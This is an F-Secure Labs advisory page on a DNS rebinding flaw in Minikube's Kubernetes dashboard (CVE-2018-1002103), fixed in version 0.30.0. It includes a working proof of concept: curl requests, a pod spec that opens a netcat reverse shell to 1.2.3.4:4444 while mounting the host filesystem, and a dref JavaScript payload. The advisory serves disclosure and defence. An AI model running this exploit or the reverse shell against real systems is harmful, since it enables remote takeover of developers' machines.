<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="og:title" content="Minikube RCE and VM escape"><meta property="og:description" content="The Kubernetes dashboard service on Minikube is vulnerable to DNS rebinding attacks that can lead to remote code execution on the host."><meta property="og:image" content="https://pbs.twimg.com/profile_images/697739745959481344/elXEmNJm_400x400.png">
<meta name="x-subsite-id" content="1" />

    <title>Minikube RCE &amp; VM Escape</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/minikube-rce/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/minikube-rce/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/minikube-rce/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Minikube RCE &amp; VM Escape</h1>
      <p>The Kubernetes dashboard service on Minikube is vulnerable to DNS rebinding attacks that can lead to remote code execution on the host.</p>
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Minikube</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2018-1002103</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>Remote Code Execution</td>
          </tr>
        </table>
        
        <h3>Description</h3><p>Minikube is a popular option for testing and developing locally for Kubernetes, and is part of the larger Kubernetes project.</p><p>The Kubernetes dashboard service on Minikube is vulnerable to DNS rebinding attacks that can lead to remote code execution on the host operating system.</p><p>This issue would typically be exploited via a malicious web page, for example through a watering hole or phishing attack.</p><h3>Impact</h3><p>An attacker can obtain containerized remote code execution in the Minikube VM by posting a deployment to the Kubernetes dashboard. When using VirtualBox, VMWare Fusion or Xhyve, the attacker may also break out of the Minikube VM by mounting the host user's home directory</p><p>This attack can lead to persistent access to the host operating system.</p><h3>Cause</h3><h4>Remote Code Execution</h4><p>The Kubernetes dashboard is enabled by default on Minikube installations and is accessible on the Minikube VM on port 30000/TCP. The Minikube VM itself is provisioned on a host-only network, and as such is only intended to be accessed by the host.</p><p>A malicious web page may nonetheless interact with the dashboard through a DNS rebinding attack.</p><p>DNS rebinding allows a web page to bypass the Same-Origin Policy by dynamically manipulating the DNS records of a domain. For example, the domain <em>attacker.com</em> may initially map to an external IP address such as <em>1.2.3.4</em> to deliver a malicious JavaScript payload. The domain’s A record can then be remapped to an internal IP, such as <em>192.168.99.100</em>. The JavaScript payload can then communicate with the internal IP without violating the Same-Origin Policy.</p><p>The Kubernetes dashboard service on a Minikube installation is vulnerable to DNS rebinding because:</p><ul><li>the Minikube VM uses predictable IP addresses (for example <em>192.168.99.100</em> for VirtualBox or <em>192.168.64.1</em> for Hyperkit)</li>
<li>the service runs on a known port: 30000/TCP</li>
<li>the service does not use HTTPS</li>
<li>the service does not validate the HTTP Host header</li>
</ul><h4>VM Escape</h4><p>The VirtualBox, VMWare Fusion and Xhyve drivers will mount the host user's home directory by default. An attacker may configure a deployment to mount the home directory from the Minikube VM into a container. This essentially allows the attacker to break out of the Minikube VM. The image below illustrates the chain of mounts on a MacOS host:</p><p><img class="leftAlone" style="display: block; margin-left: auto; margin-right: auto;" title="" src="assets/Uploads/update.png" alt="update" width="401" height="231"><br>The attacker may then, for example, backdoor the user's<em> .bash_profile</em>, or retrieve private keys to gain access to other systems.</p><h3>Interim Workaround</h3><p>The issue affects versions of Minikube prior to 0.30.0. If running on an affected version, it is recommended to disable the Kubernetes dashboard service from Minikube:</p><pre>$ minikube addons disable dashboard</pre><h3>Solution</h3><p>The issue was fixed in release <em>0.30.0</em>. It is recommended to upgrade.</p><p>The issue was remediated by:</p><ul><li>exposing the service through <em>kubectl proxy</em> instead of a NodePort</li>
<li>validating the Host header from incoming HTTP requests matches the pattern <em>127.0.0.1:{port}</em></li>
<li>exposing the dashboard service on a random port</li>
</ul><h3>Technical Details</h3><p>A malicious web page will start by triggering a DNS rebind against the Kubernetes dashboard to bypass the Same-Origin Policy. From then on, the page will be in a position to read responses from the dashboard.<br><br>The page can then issue a GET request to <em>/api/v1/csrftoken/appdeploymentfromfile</em> to obtain a valid CSRF token for a deployment from the dashboard. A <em>curl</em> request for obtaining a CSRF token is given below:</p><pre>$ curl http://192.168.99.100:30000/api/v1/csrftoken/appdeploymentfromfile<br>{<br>  "token": "AQ_3pRIv6gjjoVkniBS9xK6tSqI:1538256679430"<br>}</pre><p>The page can proceed to post an arbitrary deployment to the dashboard, using the above token to set the <em>X-CSRF-TOKEN</em> header. An attacker could, for example, create a deployment with a container that will connect a reverse shell back to the attacker. The attacker may also wish to mount the host user's home directory into the container, trivially breaking out of the container and hypervisor.</p><p>The deployment below will create a reverse shell back to an attacker at <em>1.2.3.4:4444</em> and mount the home directory of a MacOS user:</p><pre>apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: dns-rebind-rce-poc<br>spec:<br>  containers:<br>  - name: busybox<br>    image: busybox:1.29.2<br>    command: ["/bin/sh"]<br>    args: ["-c", "nc 1.2.3.4 4444 -e /bin/sh"]<br>    volumeMounts:<br>    - name: host<br>      mountPath: /host<br>  volumes:<br>  - name: host<br>    hostPath:<br>      path: /Users/<br>      type: Directory</pre><p>A <em>curl</em> request that would create this deployment is given below:</p><pre>$ curl 'http://192.168.99.100:30000/api/v1/appdeploymentfromfile' -H 'X-CSRF-TOKEN: eT3xz2k_26fNCBzPpIZ1-A1s-gE:1538254867049' -H 'Content-Type: application/json;charset=utf-8'  --data '{"name":"","namespace":"default","content":"apiVersion: v1\nkind: Pod\nmetadata:\n  name: dns-rebind-rce-poc\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.29.2\n    command: [\"/bin/sh\"]\n    args: [\"-c\", \"nc 1.2.3.4 4444 -e /bin/sh\"]\n    volumeMounts:\n    - name: host\n      mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\n      type: Directory\n","validate":true}'</pre><p>As a result of the above request, the attacker will receive a reverse shell with access to the home directory:</p><pre>~# nc -lvp 4444<br>Listening on [0.0.0.0] (family 0, port 4444)<br>Connection from [4.3.2.1] port 4444 [tcp/*] accepted (family 2, sport 55593)<br>ls -lh /host/Users/user/<br>total 124<br>drwxr-xr-x    1 1001     1001        1.8K Sep 29 14:19 .<br>drwxr-xr-x    1 1001     1001         160 Mar 30  2018 ..<br>drwx------    1 1001     1001          96 Aug 27 10:04 Applications<br>drwx------    1 1001     1001         128 Sep 24 17:45 Desktop<br>drwx------    1 1001     1001         160 Aug  8 18:29 Documents<br>drwx------    1 1001     1001        1.2K Sep 29 17:14 Downloads<br>drwx------    1 1001     1001        1.9K Jun 12 11:16 Library<br>drwx------    1 1001     1001          96 Mar 30  2018 Movies<br>drwx------    1 1001     1001         128 Apr  1 13:38 Music<br>drwx------    1 1001     1001         320 Sep  6 07:27 Pictures<br>drwxr-xr-x    1 1001     1001         544 Sep 29 12:54 Projects<br>drwxr-xr-x    1 1001     1001         128 Mar 30  2018 Public<br>drwxr-xr-x    1 1001     1001          96 Mar 30  2018 Scripts<br>drwxr-xr-x    1 1001     1001         128 May 27 21:46 VirtualBox VMs</pre><h3>Proof of Concept</h3><p>This section provides an implementation of the attack using MWR's DNS rebinding exploitation framework <a href="https://github.com/mwrlabs/dref"><em>dref</em></a>.<br><br>To conduct the attack the <em>docker-compose.yml</em> should to be modified to expose 30000/TCP:</p><pre>services:<br>  api:<br>    ...<br>    ports:<br>      - 0.0.0.0:80:80<br>      - 0.0.0.0:30000:30000</pre><p>The <em>dref-config.yml</em> should also be modified to create a subdomain pointing to the custom Minikube payload:</p><pre>targets:<br>  - target: "minikube"<br>    script: "minikube"</pre><p>Finally, the custom payload should be stored in <em>dref/scripts/src/payloads/minikube.js</em>:</p><pre>import NetMap from 'netmap.js'<br>import * as network from '../libs/network'<br>import Session from '../libs/session'<br><br>// hosts and ports to check for Kubernetes dashboard<br>const hosts = ['192.168.99.100']<br>const ports = [30000]<br><br>// paths for fetching CSRF token and POSTing the deployment<br>const tokenPath = '/api/v1/csrftoken/appdeploymentfromfile'<br>const deployPath = '/api/v1/appdeploymentfromfile'<br>// payload to deploy<br>const deployment = `apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: dns-rebind-rce-poc<br>spec:<br>  containers:<br>  - name: busybox<br>    image: busybox:1.29.2<br>    command: ["/bin/sh"]<br>    args: ["-c", "nc 1.2.3.4 4444 -e /bin/sh"]<br>    volumeMounts:<br>    - name: host<br>      mountPath: /host<br>  volumes:<br>  - name: host<br>    hostPath:<br>      path: /<br>      type: Directory<br>`<br><br>const session = new Session()<br>const netmap = new NetMap()<br><br>// this function runs first on the original page<br>// it'll scan hosts/ports and open an iFrame for the rebind attack<br>async function main () {<br>  netmap.tcpScan(hosts, ports).then(results =&gt; {<br>    for (let h of results.hosts) {<br>      for (let p of h.ports) {<br>        if (p.open) session.createRebindFrame(h.host, p.port)<br>      }<br>    }<br>  })<br>}<br><br>// this function funs in rebinding iframes<br>function rebind () {<br>  // after this, the Origin maps to the Kubernetes dashboard host:port<br>  session.triggerRebind().then(() =&gt; {<br>    network.get(session.baseURL + tokenPath, {<br>      successCb: (code, headers, body) =&gt; {<br>        const token = JSON.parse(body).token<br><br>        network.postJSON(session.baseURL + deployPath, {<br>          'name': '',<br>          'namespace': 'default',<br>          'validate': true,<br>          'content': deployment<br>        }, {<br>          headers: {<br>            'X-CSRF-TOKEN': token<br>          }<br>        })<br>      }<br>    })<br>  })<br>}<br><br>if (window.args &amp;&amp; window.args._rebind) rebind()<br>else main()</pre><p>A Minikube user visiting <em>http://minikube.{dref_domain}.com</em> will be exploited and a reverse shell with the host’s file system mounted will be given to the attacker on <em>1.2.3.4:4444</em>.</p><h3>Detailed Timeline</h3><table><tbody><tr><td>Date</td>
<td>Summary</td>
</tr><tr><td>2018-09-29</td>
<td>Issue communicated to Kubernetes security contact</td>
</tr><tr><td>2018-10-02</td>
<td>Confirmation of receipt by Kubernetes</td>
</tr><tr><td>2018-10-04</td>
<td>Kubernetes advise that the release the following day will remediate the issue</td>
</tr><tr><td>2018-10-05</td>
<td>Minikube 0.30.0 released with remediation</td>
</tr></tbody></table><h3>Further Information</h3><ul><li><a href="https://github.com/kubernetes/minikube/issues/3208">GitHub issue</a></li>
<li><a href="https://github.com/kubernetes/minikube/commit/583937ac3e23e79b93b523488085fc73e159b719">Commit remediating issue</a></li>
</ul><p> </p>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/minikube-rce/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/minikube-rce/&text=Minikube RCE &amp; VM Escape" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/minikube-rce/&title=Minikube RCE &amp; VM Escape" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/minikube-rce/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
